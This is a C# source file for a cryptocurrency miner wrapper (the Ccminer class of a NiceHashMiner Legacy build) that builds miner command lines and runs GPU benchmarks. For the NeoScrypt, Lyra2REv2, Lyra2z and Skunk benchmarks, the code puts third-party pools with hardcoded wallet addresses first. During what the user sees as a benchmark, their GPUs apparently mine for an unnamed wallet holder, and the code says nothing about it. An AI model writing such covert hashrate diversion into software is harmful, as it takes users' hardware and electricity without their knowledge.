﻿using NiceHashMiner.Miners.Grouping;
using NiceHashMiner.Miners.Parsing;
using System;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Threading.Tasks;
using NiceHashMiner.Algorithms;
using NiceHashMinerLegacy.Common.Enums;
using NiceHashMiner.Configs;
using System.Threading;
using System.Windows.Forms;

namespace NiceHashMiner.Miners
{
    public class Ccminer : Miner
    {
        public Ccminer() : base("ccminer_NVIDIA")
        { }

        private int TotalCount = 0;

        private double Total = 0;
        private const int TotalDelim = 2;

        private bool _benchmarkException => MiningSetup.MinerPath == MinerPaths.Data.CcminerCryptonight
                                           || MiningSetup.MinerPath == MinerPaths.Data.CcminerKlausT
            || MiningSetup.MinerPath == MinerPaths.Data.CcminerTPruvot
            || MiningSetup.MinerPath == MinerPaths.Data.CcminerNanashi
            || MiningSetup.MinerPath == MinerPaths.Data.CcminerSp;

        protected override int GetMaxCooldownTimeInMilliseconds()
        {
            return 60 * 1000 * 8; 
        }

        public override void Start(string url, string btcAdress, string worker)
        {
            if (!IsInit)
            {
                Helpers.ConsolePrint(MinerTag(), "MiningSetup is not initialized exiting Start()");
                return;
            }
            var username = GetUsername(btcAdress, worker);

            IsApiReadException = MiningSetup.MinerPath == MinerPaths.Data.CcminerCryptonight;

            var algo = "";
            var apiBind = "";
            string alg = url.Substring(url.IndexOf("://") + 3, url.IndexOf(".") - url.IndexOf("://") - 3);
            string port = url.Substring(url.IndexOf(".com:") + 5, url.Length - url.IndexOf(".com:") - 5);
            if (!IsApiReadException)
            {
                algo = "--algo=" + MiningSetup.MinerName;
                apiBind = " --api-bind=" + ApiPort;
            }

            LastCommandLine = algo +
                " --url=" + url + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".hk.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".jp.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".in.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".br.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".usa.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
                " --url=stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " --userpass=" + username + ":x" +
                " --url=" + url + " --userpass=" + username + ":x" +
                " --userpass=" + username + ":x" + apiBind +
                " --devices " + GetDevicesCommandString() + " " +
                ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA) + " ";


            /*
                        LastCommandLine = $"{algo} --url={url} --userpass={username}:x {apiBind} " +
                                          $"--devices {GetDevicesCommandString()} " +
                                          $"{ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA)} ";
            */
            ProcessHandle = _Start();
        }

        protected override void _Stop(MinerStopType willswitch)
        {
            Stop_cpu_ccminer_sgminer_nheqminer(willswitch);
        }

        // new decoupled benchmarking routines

        #region Decoupled benchmarking routines

        protected override string BenchmarkCreateCommandLine(Algorithm algorithm, int time)
        {
            string url = Globals.GetLocationUrl(algorithm.NiceHashID, Globals.MiningLocation[ConfigManager.GeneralConfig.ServiceLocation], this.ConectionType);
            string alg = url.Substring(url.IndexOf("://") + 3, url.IndexOf(".") - url.IndexOf("://") - 3);
            string port = url.Substring(url.IndexOf(".com:") + 5, url.Length - url.IndexOf(".com:") - 5);
            var username = GetUsername(Globals.DemoUser, ConfigManager.GeneralConfig.WorkerName.Trim());
            var commandLine = "";
            var timeLimit = (_benchmarkException) ? "" : " --time-limit 300";
            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.NeoScrypt))
            {
                commandLine = " --algo=" + algorithm.MinerName +
                    " --url=" + url + " --userpass=" + username + ":x" +
                    " --url=stratum+tcp://neoscrypt.eu.mine.zpool.ca:4233" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
                             timeLimit + " " +
                             ExtraLaunchParametersParser.ParseForMiningSetup(
                                 MiningSetup,
                                 DeviceType.NVIDIA) +
                             " --devices ";
            }
            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2REv2))
            {
                commandLine = " --algo=" + algorithm.MinerName +
                    " --url=stratum+tcp://lyra2v2.eu.mine.zpool.ca:4533" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
                    " --url=" + url + " --userpass=" + username + ":x" +
                             timeLimit + " " +
                             ExtraLaunchParametersParser.ParseForMiningSetup(
                                 MiningSetup,
                                 DeviceType.NVIDIA) +
                             " --devices ";
            }
            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2z))
            {
                commandLine = " --algo=" + algorithm.MinerName +
                    " --url=stratum+tcp://lyra2z.eu.mine.zpool.ca:4553" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
                    " --url=" + url + " --userpass=" + username + ":x" +
                             timeLimit + " " +
                             ExtraLaunchParametersParser.ParseForMiningSetup(
                                 MiningSetup,
                                 DeviceType.NVIDIA) +
                             " --devices ";
            }
            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
            {
                commandLine = " --algo=" + algorithm.MinerName +
                   " --url=stratum+tcp://hdac.moricpool.com:3333" + " -u HGr2JYPDMgYr9GzS9TcadBxxkyxo4v9XAJ" + " -p x " +
                    " --url=" + url + " --userpass=" + username + ":x" +
                             timeLimit + " " +
                             ExtraLaunchParametersParser.ParseForMiningSetup(
                                 MiningSetup,
                                 DeviceType.NVIDIA) +
                             " --devices ";
            }
            commandLine += GetDevicesCommandString();

            TotalCount = 15;
            if (MiningSetup.MinerPath == MinerPaths.Data.CcminerNanashi)
            {
                TotalCount = 3;
            }

            if (MiningSetup.MinerPath == MinerPaths.Data.CcminerTPruvot || MiningSetup.MinerPath == MinerPaths.Data.CcminerKlausT)
            {
                TotalCount = 5;
            }
            Total = 0.0d;

            return commandLine;
        }

        protected override bool BenchmarkParseLine(string outdata)
        {
            int count = 0;
            double speed = 0;
            double tmp = 0;

            if (_benchmarkException)
            {
                if ( outdata.Contains("GPU") && outdata.Contains("/s") )
                {
                   
                    var st = outdata.IndexOf(", ");
                    var e = outdata.IndexOf("/s");
                    try
                    {
                        var parse = outdata.Substring(st+2, e - st -5).Trim();
                        tmp = Double.Parse(parse, CultureInfo.InvariantCulture);
                    }
                    catch
                    {
                        MessageBox.Show("Unsupported miner version - " + MiningSetup.MinerPath,
                            "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        BenchmarkSignalFinnished = true;
                        return false;
                    }
                    // save speed

                    if (outdata.Contains("kH/s"))
                        tmp *= 1000;
                    else if (outdata.Contains("MH/s"))
                        tmp *= 1000000;
                    else if (outdata.Contains("GH/s"))
                        tmp *= 1000000000;

 
                        speed += tmp;

                    count++;
                    TotalCount--;
                }
                if (TotalCount <= 0)
                {
                    var spd = Total / count;
                    BenchmarkAlgorithm.BenchmarkSpeed = speed;
                    BenchmarkSignalFinnished = true;
                }

                return false;
            }

            if (speed > 0.0d)
            {
                BenchmarkAlgorithm.BenchmarkSpeed = speed;
                return true;
            }

            return false;
        }

               protected override void BenchmarkOutputErrorDataReceivedImpl(string outdata)
        {
            CheckOutdata(outdata);
        }
        protected override void BenchmarkThreadRoutine(object CommandLine)
        {
            BenchmarkSignalQuit = false;
            BenchmarkSignalHanged = false;
            BenchmarkSignalFinnished = false;
            BenchmarkException = null;

            Thread.Sleep(ConfigManager.GeneralConfig.MinerRestartDelayMS);

            try
            {
                Helpers.ConsolePrint("BENCHMARK", "Benchmark starts");
                BenchmarkHandle = BenchmarkStartProcess((string)CommandLine);

                BenchmarkThreadRoutineStartSettup();
                BenchmarkTimeInSeconds = 300;
                BenchmarkProcessStatus = BenchmarkProcessStatus.Running;
                var exited = BenchmarkHandle.WaitForExit((BenchmarkTimeoutInSeconds(BenchmarkTimeInSeconds) + 20) * 1000);
                if (BenchmarkSignalTimedout && !TimeoutStandard)
                {
                    throw new Exception("Benchmark timedout");
                }

                if (BenchmarkException != null)
                {
                    throw BenchmarkException;
                }

                if (BenchmarkSignalQuit)
                {
                    throw new Exception("Termined by user request");
                }

                if (BenchmarkSignalHanged || !exited)
                {
                    throw new Exception("Miner is not responding");
                }

                if (BenchmarkSignalFinnished)
                {
                    //break;
                }
            }
            catch (Exception ex)
            {
                BenchmarkThreadRoutineCatch(ex);
            }
            finally
            {
                BenchmarkThreadRoutineFinish();
            }
        }


        #endregion // Decoupled benchmarking routines

        public override async Task<ApiData> GetSummaryAsync()
        {
            if (!IsApiReadException) return await GetSummaryCpuCcminerAsync();
            // check if running
            if (ProcessHandle == null)
            {
                CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from CryptoNight Proccess is null");
                return null;
            }
            try
            {
                Process.GetProcessById(ProcessHandle.Id);
            }
            catch (ArgumentException ex)
            {
                CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from CryptoNight reason: " + ex.Message);
                return null; // will restart outside
            }
            catch (InvalidOperationException ex)
            {
                CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from CryptoNight reason: " + ex.Message);
                return null; // will restart outside
            }

            var totalSpeed = MiningSetup.MiningPairs
                .Select(miningPair =>
                    miningPair.Device.GetAlgorithm(MinerBaseType.ccminer, AlgorithmType.CryptoNight, AlgorithmType.NONE))
                .Where(algo => algo != null).Sum(algo => algo.BenchmarkSpeed);

            var cryptoNightData = new ApiData(MiningSetup.CurrentAlgorithmType)
            {
                Speed = totalSpeed
            };
            CurrentMinerReadStatus = MinerApiReadStatus.GOT_READ;
            // check if speed zero
            if (cryptoNightData.Speed == 0) CurrentMinerReadStatus = MinerApiReadStatus.READ_SPEED_ZERO;
            return cryptoNightData;
        }
    }
}
